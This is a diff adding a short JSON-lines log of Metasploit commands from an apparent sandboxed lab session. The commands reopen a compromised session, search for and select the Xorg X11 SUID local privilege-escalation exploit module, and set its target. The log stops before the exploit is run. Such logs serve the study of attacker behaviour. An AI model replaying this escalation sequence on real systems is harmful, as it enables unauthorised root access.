@@ -1,0 +1,6 @@
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:58:43.394283Z", "cmd_type": "msf-command", "cmd": "sessions -i 1"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:59:27.039208Z", "cmd_type": "msf-command", "cmd": "search xorg"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:59:37.689613Z", "cmd_type": "msf-command", "cmd": "use exploit/multi/local/xorg_x11_suid_server "}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:59:39.964829Z", "cmd_type": "msf-command", "cmd": "show options "}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:59:52.755482Z", "cmd_type": "msf-command", "cmd": "set TARGET 0"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T15:59:55.890473Z", "cmd_type": "msf-command", "cmd": "show options "}
